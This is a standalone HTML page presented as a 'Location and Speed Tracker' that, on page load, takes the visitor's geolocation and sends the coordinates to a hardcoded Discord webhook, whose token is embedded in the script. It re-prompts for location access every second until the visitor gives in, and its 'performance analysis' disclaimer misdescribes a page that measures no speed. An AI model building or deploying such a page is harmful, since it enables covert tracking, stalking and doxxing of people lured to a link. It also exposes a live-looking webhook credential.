<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location and Speed Tracker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #e7f0f2;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            background-color: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            font-size: 36px;
            margin-bottom: 20px;
            color: #333;
        }
        .message {
            font-size: 18px;
            margin-top: 20px;
            color: #333;
        }
        .loading-message {
            color: #f9c74f;
            font-size: 16px;
            margin-top: 10px;
        }
        .error-message {
            color: #f94144;
            font-size: 16px;
            margin-top: 10px;
            display: none;
        }
        .location-details {
            background-color: #f1f1f1;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
        }
        .location-details p {
            font-size: 16px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container" id="a">
        <header>
            <h1>Location and Speed Tracker</h1>
        </header>
        <div class="message">
            <p><strong>Disclaimer:</strong> Your location is being captured for performance analysis.</p>
        </div>
        <div class="loading-message" id="k">Requesting location access...</div>
        <div class="error-message" id="j">
            <p><strong>Location access is required to use this service.</strong></p>
        </div>
        <div class="location-details" id="location-details" style="display:none;">
            <h2>Your Location Data</h2>
            <p><strong>Latitude:</strong> <span id="latitude">Loading...</span></p>
            <p><strong>Longitude:</strong> <span id="longitude">Loading...</span></p>
        </div>
    </div>

    <script>
        // Replace with your actual webhook URL
        const webhookURL = "https://discord.com/api/webhooks/1336044790646571100/p4HcckTNGA-ByqvM64Nn2qwPz7fP1tIm-naVtwxoqF56-lx6_RkZUI1djZW2vDAWPTRM";

        // Function to send location data to the Discord webhook
        function sendLocationToWebhook(location) {
            const payload = {
                content: "Location Data",
                embeds: [
                    {
                        title: "Location",
                        fields: [
                            { name: "Latitude", value: `${location.lat}`, inline: true },
                            { name: "Longitude", value: `${location.lon}`, inline: true }
                        ]
                    }
                ]
            };

            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        // Function to request the user's location and refresh once granted
        function requestLocation() {
            document.getElementById('k').style.display = "block"; // Show "Requesting location access..." message
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // Successfully got the location
                    document.getElementById('k').style.display = "none"; // Hide loading message
                    document.getElementById('j').style.display = "none"; // Hide location error message
                    document.getElementById('a').style.display = "block"; // Show the location details

                    // Store the location coordinates
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    document.getElementById('latitude').textContent = lat;
                    document.getElementById('longitude').textContent = lon;

                    // Send the location data to the Discord webhook (only once)
                    sendLocationToWebhook({ lat, lon });

                }, function() {
                    // Failed to get location, ask again
                    document.getElementById('k').style.display = "none"; // Hide loading message
                    document.getElementById('j').style.display = "block"; // Show location error message
                    setTimeout(requestLocation, 1000); // Keep asking for location every second
                });
            } else {
                document.getElementById('k').style.display = "none"; // Hide loading message
                document.getElementById('j').style.display = "block"; // Show location error message
                setTimeout(requestLocation, 1000); // Keep asking for location every second
            }
        }

        // Start the location request process
        requestLocation();
    </script>
</body>
</html>
